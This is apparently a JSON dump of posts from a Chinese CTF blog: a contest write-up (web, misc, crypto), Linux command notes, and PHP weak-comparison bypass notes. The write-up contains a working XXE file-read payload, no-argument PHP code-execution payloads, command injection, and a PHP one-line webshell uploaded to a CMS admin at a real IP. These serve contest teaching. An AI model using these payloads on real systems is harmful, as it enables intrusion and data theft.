还没有wp","categories":[{"name":"比赛writeup","slug":"比赛writeup","permalink":"https://flag2020.top/categories/%E6%AF%94%E8%B5%9Bwriteup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://flag2020.top/tags/writeup/"}]},{"title":"第三届海啸杯 write up","slug":"第三届海啸杯 write up","date":"2020-11-19T06:00:00.000Z","updated":"2020-11-26T16:10:04.232Z","comments":true,"path":"2020/11/19/第三届海啸杯 write up/","link":"","permalink":"https://flag2020.top/2020/11/19/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF%20write%20up/","excerpt":"WEBG2mtu学生?X-Forwarded-For绕过、Cookie伪造 用Burp Suite抓包，将user=0改为user=1，添加X-Forwarded-For:127.0.0.1","text":"WEBG2mtu学生?X-Forwarded-For绕过、Cookie伪造 用Burp Suite抓包，将user=0改为user=1，添加X-Forwarded-For:127.0.0.1 Who are you？用Burp suite抓包，发现 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;feedback&gt;&lt;author&gt;aaa&lt;/author&gt;&lt;/feedback&gt; 好像是XXE漏洞，在书上查看攻击方式 尝试用php伪协议读取flag.php 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot; &gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;b;&lt;/xxe&gt;&lt;/xml&gt; 发现读不出来，跳转到根目录下读取也不行 1php://filter/read=convert.base64-encode/resource=../../../../../../flag.php 尝试读取index.php，读取成功，得到 1PD9waHANCmxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIoZmFsc2UpOw0KJGRhdGEgPSBAZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7DQokcmVzcCA9ICcnOw0KLy8kZmxhZz0nZmxhZ3s3OWQxMDYyNi1kMjdmLTQ1NjktYTYyOS1jOTYwNmQwMzc4ZjJ9JzsNCmlmKCRkYXRhICE9IGZhbHNlKXsNCiAgICAkZG9tID0gbmV3IERPTURvY3VtZW50KCk7DQogICAgJGRvbS0+bG9hZFhNTCgkZGF0YSwgTElCWE1MX05PRU5UKTsNCiAgICBvYl9zdGFydCgpOw0KICAgICRyZXMgID0gJGRvbS0+dGV4dENvbnRlbnQ7DQogICAgJHJlc3AgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICBvYl9lbmRfY2xlYW4oKTsNCiAgICBpZiAoJHJlcyl7DQogICAgICAgIGRpZSgkcmVzKTsNCiAgICB9DQoNCn0NCj8+DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIj4NCjxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICA8dGl0bGU+d2VsY29tZTwvdGl0bGU+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL3N0eWxlLmNzcyI+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KICAgIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iaWU9ZWRnZSI+DQoNCjwvaGVhZD4NCjxib2R5IGNsYXNzPSJjb250YWN0Qm9keSI+DQo8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4NCiAgICA8ZGl2IGNsYXNzPSJ0aXRsZSI+DQoNCg0KICAgIDwvZGl2Pg0KDQoNCiAgICA8Zm9ybSBtZXRob2Q9InBvc3QiIGNsYXNzPSJmb3JtIj4NCiAgICAgICAgPGgxIGlkPSJ0aXRsZSI+6K+36L6T5YWl5aeT5ZCNPC9oMT4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJuYW1lIGVudHJ5ICIgaWQ9Im5hbWUiIG5hbWU9Im5hbWUiIHBsYWNlaG9sZGVyPSJZb3VyIE5hbWUiLz4NCiAgICA8L2Zvcm0+DQogICAgPGJ1dHRvbiBjbGFzcz0ic3VibWl0IGVudHJ5IiBvbmNsaWNrPSJmdW5jKCkiPlN1Ym1pdDwvYnV0dG9uPg0KDQogICAgPGRpdiBjbGFzcz0ic2hhZG93Ij48L2Rpdj4NCjwvZGl2Pg0KDQo8L2JvZHk+DQo8L2h0bWw+DQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQogICAgZnVuY3Rpb24gcGxheSgpIHsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBmdW5jdGlvbiBmdW5jKCkgew0KICAgICAgICAvLyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgpLnZhbHVlDQogICAgICAgIHZhciB4bWwgPSAnJyArDQogICAgICAgICAgICAnPFw&#x2F;eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ilw&#x2F;PicgKw0KICAgICAgICAgICAgJzxmZWVkYmFjaz4nICsNCiAgICAgICAgICAgICc8YXV0aG9yPicgKyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmFtZScpLnZhbHVlKyAnPC9hdXRob3I+JyArDQogICAgICAgICAgICAnPC9mZWVkYmFjaz4nOw0KICAgICAgICBjb25zb2xlLmxvZyh4bWwpOw0KICAgICAgICB2YXIgeG1saHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOw0KICAgICAgICB4bWxodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uICgpIHsNCiAgICAgICAgICAgIGlmICh4bWxodHRwLnJlYWR5U3RhdGUgPT0gNCkgew0KICAgICAgICAgICAgICAgIC8vIGNvbnNvbGUubG9nKHhtbGh0dHAucmVhZHlTdGF0ZSk7DQogICAgICAgICAgICAgICAgLy8gY29uc29sZS5sb2coeG1saHR0cC5yZXNwb25zZVRleHQpOw0KICAgICAgICAgICAgICAgIHZhciByZXMgPSB4bWxodHRwLnJlc3BvbnNlVGV4dDsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGl0bGUnKS50ZXh0Q29udGVudCA9IHJlcw0KICAgICAgICAgICAgfQ0KICAgICAgICB9Ow0KICAgICAgICB4bWxodHRwLm9wZW4oIlBPU1QiLCAiaW5kZXgucGhwIiwgdHJ1ZSk7DQogICAgICAgIHhtbGh0dHAuc2VuZCh4bWwpOw0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfTsNCjwvc2NyaXB0Pg0KPC9ib2R5Pg0KPC9odG1sPg&#x3D;&#x3D; 用base64解密，得到源码，flag就在源码里 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;?phplibxml_disable_entity_loader(false);$data = @file_get_contents(&#x27;php://input&#x27;);$resp = &#x27;&#x27;;//$flag=&#x27;flag&#123;79d10626-d27f-4569-a629-c9606d0378f2&#125;&#x27;;if($data != false)&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($data, LIBXML_NOENT); ob_start(); $res = $dom-&gt;textContent; $resp = ob_get_contents(); ob_end_clean(); if ($res)&#123; die($res); &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;welcome&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./style.css&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;&lt;/head&gt;&lt;body class=&quot;contactBody&quot;&gt;&lt;div class=&quot;wrapper&quot;&gt; &lt;div class=&quot;title&quot;&gt; &lt;/div&gt; &lt;form method=&quot;post&quot; class=&quot;form&quot;&gt; &lt;h1 id=&quot;title&quot;&gt;è¯·è¾å¥å§å&lt;/h1&gt; &lt;br/&gt; &lt;br/&gt; &lt;br/&gt; &lt;input type=&quot;text&quot; class=&quot;name entry &quot; id=&quot;name&quot; name=&quot;name&quot; placeholder=&quot;Your Name&quot;/&gt; &lt;/form&gt; &lt;button class=&quot;submit entry&quot; onclick=&quot;func()&quot;&gt;Submit&lt;/button&gt; &lt;div class=&quot;shadow&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;script type=&quot;text/javascript&quot;&gt; function play() &#123; return false; &#125; function func() &#123; // document.getElementById().value var xml = &#x27;&#x27; + &#x27;&lt;\\?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;\\?&gt;&#x27; + &#x27;&lt;feedback&gt;&#x27; + &#x27;&lt;author&gt;&#x27; + document.getElementById(&#x27;name&#x27;).value+ &#x27;&lt;/author&gt;&#x27; + &#x27;&lt;/feedback&gt;&#x27;; console.log(xml); var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = function () &#123; if (xmlhttp.readyState == 4) &#123; // console.log(xmlhttp.readyState); // console.log(xmlhttp.responseText); var res = xmlhttp.responseText; document.getElementById(&#x27;title&#x27;).textContent = res &#125; &#125;; xmlhttp.open(&quot;POST&quot;, &quot;index.php&quot;, true); xmlhttp.send(xml); return false; &#125;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 无参数RCE12345678910111213141516&lt;?php//flag in flag.php$a=&quot;&quot;;if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; if(preg_match(&quot;/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/&quot;, $_GET[&#x27;code&#x27;]))&#123; die(&quot;no no no !&quot;); &#125; eval(&quot;\\$a=&quot;.$_GET[&#x27;code&#x27;]); if(preg_match(&#x27;/flag/&#x27;, $a))&#123; die(&quot;no&quot;); &#125; echo($a);&#125; else &#123; show_source(__FILE__);&#125;?&gt; 利用SESSIONID来传参，读取flag 12&#x2F;?code&#x3D;Show_source(Session_id(Session_start()));PHPSESSID&#x3D;flag.php 或者： 用scandir()读取目录源码，但必须带有参数（’.’），无法通过正则匹配 用pos()取localeconv()返回的数组的第一个元素，也就是”.” 但pos()被过滤了，用current()替换，print_r也被过滤了，尝试用大写 1&#x2F;?code&#x3D;Print_r(scandir(current(localeconv()))); 得到 1Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; admin.php [3] &#x3D;&gt; flag.php [4] &#x3D;&gt; hahaha.php [5] &#x3D;&gt; index.php ) 1 hint：反转，随机数 1&#x2F;?code&#x3D;Var_dump(Readfile(array_rand(array_flip(scandir(Pos(localeconv())))))); 一直刷新，直到看到int(55)，查看源码也可以看到flag 123readfile() 输出一个文件array_rand() 函数返回数组中的随机键名，或者如果规定函数返回不只一个键名，则返回包含随机 键名的数组。 array_flip() 函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。 神奇的登录框看了宇豪师兄的博客：浅谈ctf中无回显，才知道怎么做 |ls &gt; 1.txt 1231.txtflagggg.phpindex.php |cat flagggg.php &gt; 2.txt cms参考：[代码审计]XiaoCms（后台任意文件上传至getshell,任意目录删除,会话固定漏洞 管理员账号：admin 密码：admin8888 在管理员后台新建表单 123456789&lt;html&gt; &lt;body&gt; &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;129.204.81.127:6333&#x2F;admin&#x2F;index.php?c&#x3D;uploadfile&amp;a&#x3D;uploadify_upload&amp;type&#x3D;php&amp;size&#x3D;1000&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt; &lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 上传一句话木马 test3.php 12&lt;?php@eval($_POST[&#x27;cmd&#x27;]); 点击提交，得到文件路径 http://129.204.81.127:6333/data/upload/file/202011/28022b121a56bd7461ecdb38db70cd1f.php 用蚁剑打开，密码为cmd，在文件根目录下找到flag misc表白用010editor打开，修改图片高度，就可以看到flag 老烟枪将cxk.jpg拖到kali，提取隐藏文件 1binwalk -e cxk.jpg 得到flag.png，用ps水平翻转，就可以看清楚flag lsbLSB隐写，用Stegsolve打开，点Analyse-Data Extract 点击Save Bin 保存为1.png，是一张二维码，扫码就可以得到flag 你能破解吗?hint：压缩包密码为g2mtu加四位数字 生成密码字典 1234file = open(&quot;1.dic&quot;,&quot;w&quot;)for i in range(1000,10000): file.write(&quot;g2mtu&quot;+str(i)+&quot;\\n&quot;)file.close() 解压得到flag.txt 1dGhpcyBpcyB5b3VyIGZsYWd7dzNsZTBjb21lX3RvX0cybXRVY1RmfQ&#x3D;&#x3D; 用base64解密得到flag 1flag&#123;w3le0come_to_G2mtUcTf&#125; disk参考：2020易博霖CTFMisc2–Disk题解 用提取隐藏文件 readme： 12Q:where is passw0rd?A:Be Deleted. 应该要恢复被删除的密码的，可是extundelete安装不了 只能用010editor打开disk0，查找有没有密码 尝试了好几个：password，passw0rd，passwd，pass，word，ps，wd 最后找到一个类似密码的东西 1don0tgu355p@sswd 解压lever1.zip，得到flag.png 修改图片高度就可以得到flag Crypto恺撒将军题目： 恺撒将军使用了一种技术运筹帷幄，指挥千里将士决胜千里。 敌军正好截获了一串密文 ]p{k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@ offset: 3 用java String字符串与Ascii互相转换的代码解密 Test02 1234567891011public class Test02 &#123; public static void main(String[] args) &#123; String string = &quot;]p&#123;k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@&quot;; StringBuilder sb = new StringBuilder(); char[] ch = string.toCharArray(); for (int i = 0; i &lt; ch.length; i++) &#123; sb.append(Integer.valueOf(ch[i]).intValue()-3).append(&quot; &quot;);// 加空格 &#125; System.out.println(sb.toString()); &#125;&#125; 190 109 120 104 90 51 116 106 99 110 108 119 100 71 57 102 97 88 78 102 97 72 104 105 88 51 78 118 88 50 86 66 99 51 107 119 102 81 61 61 Test03 1234567891011public class Test03 &#123; public static void main(String[] args) &#123; String value = &quot;90 109 120 104 90 51 116 106 99 110 108 119 100 71 57 102 97 88 78 102 97 72 104 105 88 51 78 118 88 50 86 66 99 51 107 119 102 81 61 61 &quot;; StringBuffer sbu = new StringBuffer(); String[] chars = value.split(&quot; &quot;); for (int i = 0; i &lt; chars.length; i++) &#123; sbu.append((char) Integer.parseInt(chars[i])); &#125; System.out.println(sbu.toString()); &#125;&#125; 1ZmxhZ3tjcnlwdG9faXNfaHhiX3NvX2VBc3kwfQ&#x3D;&#x3D; base64解密后得到flag 1flag&#123;crypto_is_hxb_so_eAsy0&#125; 小明家的小菜园题目： 小明家菜园要建栅栏，请教了他心爱的女神，女神给了这么点提示，他却看不懂，你能帮助他吗？ f_tnluz_aghggeao{t_oy_ldoia} 栅栏密码 1flag&#123;yo_uget_itzha_lan_good&#125; 战报我军成功捣毁敌军秘密电台缴获密文和明文一份，但是还有一份密文难以破解特请你来破译密码： 待解密文：givfome 用脚本进行词频分析 12345678910111213141516171819202122import sysalphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =&#123;&#125;[]&quot;data = input()result = &#123;d:0 for d in alphabet&#125;def sort_by_value(d): items = d.items() backitems = [[v[1],v[0]] for v in items] backitems.sort(reverse=True) print(backitems,&#x27;\\n\\n&#x27;) return [ backitems[i][1] for i in range(0,len(backitems))]for d in data: for alpha in alphabet: if d == alpha: result[alpha] = result[alpha] + 1print(&#x27;&#x27;.join(sort_by_value(result))) 密文： 1givfometjlysnhuczkwbrqdxpa&#125;&#123;_^][ZYXWVUTSRQPONMLKJIHGFEDCBA@&#x3D;9876543210-+*)(&amp;%$#! 明文： 12eantosirlhugdpcmf0wybvkA)(S21xTPC86-zjWLE4qUNMIGB53&#125;&#123;_^]ZYXVRQOKJHFD@&#x3D;97+*&amp;%$#! 解密密文：givfome，得到flag 1flag&#123;eantosi&#125;","categories":[{"name":"比赛writeup","slug":"比赛writeup","permalink":"https://flag2020.top/categories/%E6%AF%94%E8%B5%9Bwriteup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://flag2020.top/tags/writeup/"}]},{"title":"学习笔记——Linux","slug":"学习笔记——Linux","date":"2020-11-12T14:00:00.000Z","updated":"2020-11-12T14:10:05.292Z","comments":true,"path":"2020/11/12/学习笔记——Linux/","link":"","permalink":"https://flag2020.top/2020/11/12/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Linux/","excerpt":"Linux是开源的操作系统，系统特点有：开放性（开源）、多用户、多任务、良好的用户界面、优异的性能与稳定性等等。 学习笔记目录： 文件目录结构 终端 路径 指令","text":"Linux是开源的操作系统，系统特点有：开放性（开源）、多用户、多任务、良好的用户界面、优异的性能与稳定性等等。 学习笔记目录： 文件目录结构 终端 路径 指令 文件目录结构 bin：全称binary，含义是二进制。该目录中存储的都是一些二进制文件，文件都是可以被运行的。 dev：该目录中主要存放的是外接设备，例如盘、其他的光盘等。在其中的外接设备是不能直接被使用的，需要挂载（类似windows下的分配盘符）。 etc：该目录主要存储一些配置文件。 home：表示“家”，表示除了root用户以外其他用户的家目录，类似于windows下的User/用户目录。 mnt：当外接设备需要挂载的时候，就需要挂载到mnt目录下。 proc：process，表示进程，该目录中存储的是Linux运行时候的进程。 root：该目录是root用户自己的家目录。 sbin：全称super binary，该目录也是存储一些可以被执行的二进制文件，但是必须得有super权限的用户才能执行。 tmp：表示“临时”的，当系统运行时候产生的临时文件会在这个目录存着。 usr：存放的是用户自己安装的软件。类似于windows下的program files。 var：存放的程序/系统的日志文件的目录。 终端 kali：当前终端登录的用户名 @：发音at，表示”在“ kali：当前登录的主机名 ~/桌面：当前终端的工作目录 $：身份识别符，如果是超级管理员登录则显示#，否则显示$符号 超级管理员终端界面如下： 路径路径可以分为两种：相对路径和绝对路径 相对路径： ./：表示当前目录下；../：表示当前目录下 绝对路径： /：从根目录下寻找对应路径 在Linux中有一个特殊的符号“~”，表示当前用户的家目录。 指令Linux指令通用格式 #指令主体（空格） [选项]（空格） [操作对象] 一个指令可以包含多个选项 操作对象也可以是多个 ls(list) ls 列出当前工作目录下的所有文件/文件夹的名称 ls 路径 列出指定路径下的所有文件/文件夹的名称 ls 选项 路径 ls -l 路径 -l：表示list，表示以详细列表的形式进行展示 ls -a 路径 -a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹） ls -lh 路径 -lh：-a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹） pwd(print working directory) pwd 打印当前工作目录 cd(change directory) cd 路径 切换到路径所在目录 mkdir(make directory) mkdir 路径 创建目录，可以是文件夹名称也可以是包含名称的一个完整路径 mkdir -p 路径 当一次性创建多层不存在的目录的时候，添加-p参数，否则会报错 mkdir 路径1 路径2 路径3 … 表示一次性创建多个目录 touch创建文件 touch 文件路径 文件路径可以是直接的文件名也可以是路径，touch也可以同时创建多个文件 clear clear 清屏 cp(copy) cp 被复制的文档路径 文档被复制到的路径 复制文档到新路径下的位置，在复制过程中是可以对新位置的文件重命名的 cp -r 被复制的文件夹路径 文件夹被复制到的路径 -r表示递归复制 mv(move) mv 需要移动的文档路径 需要保存的位置路径 移动文档到新位置，原始文件在移动后不在原始位置 mv 需要移动的文件夹路径 需要保存的位置路径 移动一个文件夹，同移动文档 注： 在Linux中重命名的命令也是mv，语法和移动语法一样 如：重命名根目录下的a.txt为b.txt mv /a.txt /b.txt rm(remove) rm 选项 需要移除的文档路径 rm -f 需要移除的文档路径 force：表示强制删除，不提示是否删除 rm -r 需要移除的文件夹路径 -r：表示递归，删除一个目录的时候需要做递归删除，并且一般也不需要进行删除确认询问，所以移除目录的时候一般需要使用-rf选项 rm -rf 文档路径/文件夹路径/… 删除多个文档和文件夹 注： 要删除一个目录下有公共特性的文档，例如以test开头的文档，可以使用通配符* rm -f test* 表示强制删除只要文件是以test开头的，后续字符不管的文档 输出重定向一般命令的输出都会显示在终端中，有些时候需要将一些命令的执行结果想要保存到文件中进行后续的分析/统计，则这时候需要使用到的输出重定向技术。 &gt;：覆盖输出，会覆盖掉原先的文件内容 &gt;&gt;：追加输出，不会覆盖原始文件内容，会在原始内容末尾继续添加 正常执行的指令 &gt;/&gt;&gt; 文件的路径 注：文件可以不存在，不存在则新建 如：使用覆盖重定向，保存 ls -lah 的执行结果到当前目录下的 ls.txt ls -lah &gt; ls.txt cat cat 文档路径 直接打开一个文档，结果输出在终端 cat 文档路径1 文档路径2 … 文档路径n &gt; 文档路径x 配合输出重定向，将文档路径1到文档路径n的内容合并到文档路径x 管道管道符：| 管道一般可以用于“过滤”，“特殊”，“扩展处理”。 指令A | 指令B 指令A的正确输出作为指令B的操作对象 grep指令：主要用于过滤 du -sh du -sh 目录路径 查看目录的真实大小 -s：summaries，只显示汇总的大小 -h：表示以高可读性的形式进行显示 如：统计”/etc“目录实际大小 du -sh /etc/ date %F：等价于%Y-%m-%d %T：等价于%H:%M:%S 12345678%F：表示完整的年月日%T：表示完整的时分秒%Y：表示四位年份%m：表示两位月份（带前导0）%d：表示日期（带前导0）%H：表示小时（带前导0）%M：表示分钟（带前导0）%S：表示秒数（带前导0）","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://flag2020.top/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://flag2020.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"PHP 弱类型比较问题","slug":"PHP 弱类型比较问题","date":"2020-10-29T15:00:00.000Z","updated":"2020-12-23T14:33:52.465Z","comments":true,"path":"2020/10/29/PHP 弱类型比较问题/","link":"","permalink":"https://flag2020.top/2020/10/29/PHP%20%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E9%97%AE%E9%A2%98/","excerpt":"字符串和数字比较时，会先把字符串转换为数字，不能转换为数字的字符串或null，被转换为0。 bool true和任何比较都相等，除了0和false，因为0认为是bool false。 md5或者sha不能加密数组，所以在加密数组的时候会返回false。 “0x”开头跟数字的字符串（例如”0x1e240”）会被当作16进制数去比较。 只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，即0e\\d+的字符串 == ‘0’ 为true。 PHP5.3以上版本的strcmp()存在漏洞，只要$_GET[‘password’]是一个数组或者一个object即可绕过。","text":"字符串和数字比较时，会先把字符串转换为数字，不能转换为数字的字符串或null，被转换为0。 bool true和任何比较都相等，除了0和false，因为0认为是bool false。 md5或者sha不能加密数组，所以在加密数组的时候会返回false。 “0x”开头跟数字的字符串（例如”0x1e240”）会被当作16进制数去比较。 只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，即0e\\d+的字符串 == ‘0’ 为true。 PHP5.3以上版本的strcmp()存在漏洞，只要$_GET[‘password’]是一个数组或者一个object即可绕过。 字符串 md5() 240610708 0e462097431906509019562988736854 QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 参考： PHP官方手册——比较运算符 PHP 弱类型比较总结 PHP 弱类型比较问题PHP是一门弱类型语言，存在弱类型比较问题。 “==”与“===”== 数据类型不一样的时候会将数据类型转换为相同的再进行比较 === 除了对数据的值进行比较还会对数据的类型进行比较 123456789&lt;?php$o = $_GET[&#x27;o&#x27;];if(is_numeric($o))&#123; die(&quot;no hack!!&quot;);&#125;if($o==520)&#123; echo &quot;U are right!&quot;;&#125;?&gt; 输入520，则：no hack!! 输入520a，则：U are right! 1234&lt;?phpecho intval(&#x27;520a&#x27;).&#x27;&lt;br&gt;&#x27;;echo intval(&#x27;a520&#x27;);?&gt; 520 a 12345&lt;?phpvar_dump(&#x27;1&#x27;==1);echo &quot;&lt;br&gt;&quot;;var_dump(&#x27;1&#x27;===1);?&gt; bool(true)bool(false) 1234&lt;?phpvar_dump(&#x27;0e12&#x27; == &#x27;0e34&#x27;);var_dump(&#x27;0e12&#x27; === &#x27;0e34&#x27;);?&gt; bool(true)bool(false) switch弱类型比较问题switch中同样存在弱类型比较问题，原理和上面类似 12345678910111213&lt;?php $i =&quot;3a&quot;; switch ($i) &#123; case 0: case 1: case 2: echo &quot;this is two&quot;; break; case 3: echo &quot;flag&quot;; break; &#125;?&gt; 最终输出 flag 字符串和数字比较字符串和数字比较时，会先把字符串转换为数字，不能转换为数字的字符串或null，被转换为0。 如：”a”或”a1”是不能转换为数字的字符串，而”1”或”1a”是可以转换为数字的字符串 123456789&lt;?phpvar_dump(&#x27;a&#x27; == 0);var_dump(&#x27;a&#x27; == 1);var_dump(&#x27;1&#x27; == 1);var_dump(&#x27;1a&#x27; == 1);var_dump(&#x27;a1&#x27; == 1);var_dump(&#x27;12a&#x27; == 1);?&gt; bool(true)bool(false)bool(true)bool(true)bool(false)bool(false) 布尔值true和任意比较bool true和任何比较都相等，除了0和false，因为0认为是bool false。 123456&lt;?phpvar_dump(true == 0);var_dump(true == &#x27;False&#x27;);var_dump(true == 2);var_dump(true == &#x27;2&#x27;);?&gt; bool(false)bool(true)bool(true)bool(true) md5()、sha1()哈希函数相等问题123456789101112&lt;?phpif (isset($_GET[&#x27;a&#x27;]) and isset($_GET[&#x27;b&#x27;]))&#123; if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;]) &#123; if (md5($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;])) echo &#x27;flag&#x27;; else echo &#x27;Wrong&#x27;; &#125;&#125;?&gt; 要得到flag，得想办法让a和b的值不相等，但md5加密后的值相等。 由于md5或者sha不能加密数组，所以在加密数组的时候会返回false。 利用这点，给a和b分别传参两个不同的数组，就可以得到flag。 1?a[]&#x3D;1&amp;b[]&#x3D;2 十六进制比较问题123456789101112131415161718192021&lt;?phpfunction fun($number)&#123; $one = ord(&#x27;1&#x27;); $nine = ord(&#x27;9&#x27;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &#x27;54975581388&#x27;;&#125;if( fun($_GET[&#x27;a&#x27;]) ) echo &#x27;flag&#x27;;else echo &#x27;Wrong&#x27;;?&gt; ord() 函数返回字符串的首个字符的 ASCII 值。 这道题的意思就是要求输入一个key，然后这个key必须等于54975581388，但是在自定义的函数里面又不允许出现数字1到9，正好54975581388=0xccccccccc这样就绕过了检测。 “0x”开头跟数字的字符串（例如”0x1e240”）会被当作16进制数去比较。 1234&lt;?phpvar_dump(0x1e240 == 123456);var_dump(54975581388 == 0xccccccccc);?&gt; bool(true)bool(true) 1?a&#x3D;0xccccccccc hash值和字符串“0”比较在比较的时候，当出现xex模式，将会当做科学计数法进行比较。 而只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，即0e\\d+的字符串 == ‘0’ 为true。 12345678910111213&lt;?php$str1 = &quot;a&quot;;echo md5($str1);var_dump(md5($str1) == &#x27;0&#x27;);$str2 = &quot;s224534898e&quot;;echo md5($str2);var_dump(md5($str2) == &#x27;0&#x27;);$str3 = &#x27;a1b2edaced&#x27;;echo md5($str3);var_dump(md5($str3) == &#x27;0&#x27;);?&gt; 0cc175b9c0f1b6a831c399e269772661bool(false)0e420233178946742799316739797882bool(true)0e45ea817f33691a3dd1f46af81166c4bool(false) PHP 组合比较运算符组合比较运算符，符号为：&lt;=&gt; 1$c = $a &lt;=&gt; $b; 相当于 1$c = $a &gt; $b ? 1 : ( $a==$b ? 0 : -1 ); 当 $a &gt; $b 时，$c = 1 当 $a == $b 时，$c = 0 当 $a &lt; $b 时，$c = -1 123456&lt;?php$a = 1;$b = 2;$c = $a &lt;=&gt; $b;echo $c;?&gt; -1 组合比较运算符同样存在 == 弱类型比较问题，原理同 “==”与“===” 123456&lt;?php$a = &#x27;0e12&#x27;;$b = &#x27;0e34&#x27;;$c = $a &lt;=&gt; $b;echo $c;?&gt; 0 PHP strcmp() 函数1int strcmp ( string $str1 , string $str2 ) 根据ACSII表进行比较，从左到右依次进行，出现不同就停止比较，返回结果。 如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 1234&lt;?php// 二进制安全比较字符串（区分大小写）echo strcmp(&#x27;Hello&#x27;, &#x27;hello&#x27;);?&gt; -1 因为’H’的ASCII值比’h’的小，所以返回负数 12345678910&lt;?php$password=&quot;***&quot;;if(isset($_GET[&#x27;password&#x27;]))&#123; if (strcmp($_GET[&#x27;password&#x27;], $password) == 0) echo &quot;flag&quot;; else echo &quot;Wrong&quot;;&#125;?&gt; PHP5.3以上版本的strcmp()存在漏洞，只要$_GET[‘password’]是一个数组或者一个object即可绕过。 1?password[]&#x3D;a 题目weak_type112345678910&lt;?phphighlight_file(__FILE__);$o = $_GET[&#x27;o&#x27;];if(is_numeric($o))&#123; die(&quot;no hack!!&quot;);&#125;if($o==520)&#123; echo 